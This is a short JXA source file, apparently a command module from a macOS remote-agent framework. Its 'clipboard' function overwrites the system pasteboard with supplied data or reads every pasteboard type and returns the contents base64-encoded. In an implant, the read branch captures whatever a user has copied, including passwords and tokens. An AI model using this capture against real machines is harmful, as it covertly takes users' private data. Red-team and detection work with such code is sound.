exports.clipboard = function(task, command, params){
    ObjC.import('AppKit');
    let parsed_params;
    try{
        parsed_params = JSON.parse(params);
    }catch(error){
        return {"user_output": "Failed to parse parameters", "status": "error", "completed": true};
    }
    if(parsed_params.hasOwnProperty("data") && parsed_params['data'].length > 0){
        // Try setting the clipboard to whatever is in params
        try{
            $.NSPasteboard.generalPasteboard.clearContents;
            $.NSPasteboard.generalPasteboard.setStringForType($(parsed_params['data']), $.NSPasteboardTypeString);
            return {"user_output": "Successfully set the clipboard", "completed": true};
        }
        catch(error){
            return {"user_output":error.toString(), "completed": true, "status": "error"};
        }
    }
    else{
        //try just reading the clipboard data and returning it
        if(parsed_params['read'].length === 0){
            parsed_params['read'].push("public.utf8-plain-text");
        }
        try{
            let pb = $.NSPasteboard.generalPasteboard;
            let types = pb.types.js;
            let clipboard = {};
            for(let i = 0; i < types.length; i++){
                let typejs = types[i].js;
                clipboard[typejs] = pb.dataForType(types[i]);
                console.log(clipboard[typejs].js)
                console.log(clipboard[typejs].js !== undefined, parsed_params["read"], typejs, parsed_params["read"].includes(typejs));
                if(clipboard[typejs].js !== undefined && (parsed_params['read'].includes(typejs) || parsed_params['read'][0] === "*")){
                    clipboard[typejs] = clipboard[typejs].base64EncodedStringWithOptions(0).js;
                }else{
                    clipboard[typejs] = "";
                }
            }
            return {"user_output": JSON.stringify(clipboard, null, 4), "completed": true};
        }
        catch(error){
            return {"user_output":error.toString(), "completed": true, "status": "error"};
        }
    }
};
